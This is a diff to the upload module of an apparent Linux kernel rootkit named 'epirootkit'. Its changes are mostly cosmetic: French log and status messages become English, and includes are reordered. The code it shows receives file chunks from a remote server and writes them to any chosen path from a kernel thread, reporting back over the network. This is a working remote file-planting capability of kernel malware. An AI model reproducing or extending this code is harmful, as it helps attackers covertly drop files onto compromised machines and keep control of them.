@@ -1,11 +1,6 @@
-#include <linux/fs.h>
-#include <linux/kthread.h>
-#include <linux/slab.h>
-#include <linux/uaccess.h>
-#include <linux/string.h>
+#include "upload.h"
 
 #include "epirootkit.h"
-#include "upload.h"
 #include "network.h"
 
 bool receiving_file = false;
@@ -27,12 +22,13 @@ static int upload_thread_fn(void *arg) {
 
     struct file *filp = filp_open(task->path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (IS_ERR(filp)) {
-        ERR_MSG("upload_thread_fn: ouverture échouée: %s\n", task->path);
-        send_to_server("Erreur écriture fichier (thread).\n");
-    } else {
+        ERR_MSG("upload_thread_fn: failed to open: %s\n", task->path);
+        send_to_server("Error while writing file (thread).\n");
+    }
+    else {
         kernel_write(filp, task->buffer, task->size, &filp->f_pos);
         filp_close(filp, NULL);
-        send_to_server("Fichier écrit avec succès (thread).\n");
+        send_to_server("File written successfully (thread).\n");
     }
 
     kfree(task->buffer);
@@ -54,7 +50,7 @@ int handle_upload_chunk(const char *data, size_t len) {
     upload_received += to_copy;
 
     if (upload_received >= upload_size) {
-        DBG_MSG("handle_upload_chunk: réception complète, lancement thread\n");
+        DBG_MSG("handle_upload_chunk: complete, thread launched\n");
 
         struct upload_task_data *task = kmalloc(sizeof(struct upload_task_data), GFP_KERNEL);
         if (!task) {
@@ -93,6 +89,6 @@ int start_upload(const char *path, long size) {
     upload_received = 0;
     receiving_file = true;
 
-    DBG_MSG("start_upload: prêt à recevoir %ld octets vers %s\n", size, path);
+    DBG_MSG("start_upload: ready to receive %ld bytes to %s\n", size, path);
     return 0;
 }
